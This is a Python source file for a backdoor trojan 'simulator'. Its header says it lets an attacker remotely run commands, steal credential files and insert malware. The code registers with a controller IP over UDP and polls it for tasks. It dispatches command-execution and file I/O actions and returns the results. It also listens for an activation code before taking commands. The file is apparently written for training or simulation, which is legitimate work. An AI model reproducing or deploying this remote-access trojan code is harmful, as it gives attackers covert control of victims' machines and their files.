#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        backdoorTrojan.py
#
# Purpose:     This module is used to simulate a trojan to open a backdoor to a
#              allow hacker to remote run commands, steal credential files, insert
#              malware on a host without authorization. 
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1
# Created:     2023/09/21
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License  
#-----------------------------------------------------------------------------

import time
import threading

import udpCom
import backdoorTrojanGlobal as gv
import backdoorTrojanMgr

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class trojanReporter(threading.Thread):
    """ Reporter to connect to the trojan control hub to fetch the assigned task."""
    def __init__(self, id, targetIP, port=gv.RPT_PORT, regInterval=60, reportInterval=0.5) -> None:
        """ Init example: reporter = trojanReporter(1, '152.25.121.112', port=3004)
            Args:
                id (int): Trojan's ID
                targetIP (str): Trojan controller's public IP address.
                port (ing, optional): udp communication port. Defaults to gv.RPT_PORT[3004].
                checkInterval (int, optional): Re-register interval, if register failed, trojan will
                    try to loop-do the register process after the time interval. Defaults to 60 sec.
                reportInterval (float, optional): task fetch interval after register success. Defaults to 0.5 sec.
        """
        threading.Thread.__init__(self)
        self.trojanID = id
        self.connected = False
        self.regInterval = regInterval
        self.reportInterval = reportInterval
        self.client = udpCom.udpClient((targetIP, port))
        self.terminate = False

    #-----------------------------------------------------------------------------
    def run(self):
        """ Thread run() function call by start(). """
        time.sleep(1)
        while not self.terminate:
            try:
                msg = 'RPT;%s;%s' % ('Ready' if self.connected else 'Register', str(self.trojanID))
                rqst = self.client.sendMsg(msg, resp=True)
                if rqst:
                    result = self.handlResponse(rqst)
                    # send the task execution result back to controller.
                    if result is None:
                        self.connected = False
                        print('Register to hub failed: rejected.')
                    else:
                        if result != 'accept':
                            # send the result back if the hub request is not a "connection 
                            # accpeted" message.
                            self.client.sendMsg(result, resp=False)
                        self.connected = True
                else:
                    self.connected = False
                    print('Register to hub failed: no response.')
            except Exception as err:
                print('Register to hub failed: %s.' % str(err))
                self.connected = False
            time.sleep(self.reportInterval if self.connected else self.regInterval)

    #-----------------------------------------------------------------------------
    def handlResponse(self, msg):
        """ Call the related harmful action function to finished the tasks."""
        if isinstance(msg, bytes): msg = msg.decode('utf-8') 
        if gv.DEBUG_FLG: print("Response command: %s" % str(msg))
        result = None
        reqKey, reqType, data = gv.iFunMgr.parseIncomeMsg(msg)
        if reqKey is None:
            return None
        elif reqKey == 'CON':
            result = str(reqType)
        elif reqKey == 'CMD':
            result = gv.iFunMgr.runCmd(reqType, data)
        elif reqKey == 'FIO':
            result = gv.iFunMgr.fileIO(reqType, data)
        else:
            result = 'Err:Not support action.'
        return result

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class backdoorTrojan(object):
    """ Backdoor trojan main program."""

#-----------------------------------------------------------------------------
    def __init__(self, id, reportMD=gv.RPT_MD) -> None:
        """ Init example: trojan = backdoorTrojan(100, reportMD=True)
            Args:
                id (_type_): id.
                reportMD (_type_, optional): Flag to identify whether report to the 
                    trojan control hub. Defaults to gv.RPT_MD.
        """
        self.id = id
        self.active = False
        self.actCode = gv.ACT_CODE
        # Init the harmful function manager
        gv.iFunMgr = backdoorTrojanMgr.FuncManager(self)
        # Init the command receive host
        self.server = udpCom.udpServer(None, gv.UDP_PORT)
        self.server.setBufferSize(bufferSize=gv.BUF_SZ)
        # Init the reporter 
        if reportMD:
            self.reporter = trojanReporter(self.id, gv.RPT_IP,
                                           regInterval=6,
                                           reportInterval=2)
            self.reporter.start()
            print("Trojan reportor started.")
        print("Backdoor trojan inited.")

    #-----------------------------------------------------------------------------
    def run(self):
        print("Start the backdoor trojan simulator...")
        if gv.DEBUG_FLG: print("Start the UDP echo server listening port [%s]" % gv.UDP_PORT)
        self.server.serverStart(handler=self.cmdHandler)

    #-----------------------------------------------------------------------------
    def cmdHandler(self, msg):
        """ The test handler method passed into the UDP server to handle the 
            incoming messages.
        """
        if isinstance(msg, bytes): msg = msg.decode('utf-8')
        if gv.DEBUG_FLG: print("Incomming command: %s" % str(msg))
        # handle trojan active request.
        if msg == self.actCode:
            self.active = True
            return 'ready'
        if not self.active: return None
        # if trojan active, handle the attacker's action cmd:
        result = None
        reqKey, reqType, data = gv.iFunMgr.parseIncomeMsg(msg)
        if reqKey == 'CMD':
            result = gv.iFunMgr.runCmd(reqType, data)
        elif reqKey == 'FIO':
            result = gv.iFunMgr.fileIO(reqType, data)
        else:
            result = 'Err:Not support action.'
        return result

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main(mode):
    trojan = backdoorTrojan(gv.OWN_ID)
    trojan.run()

if __name__ == "__main__":
    main(0)

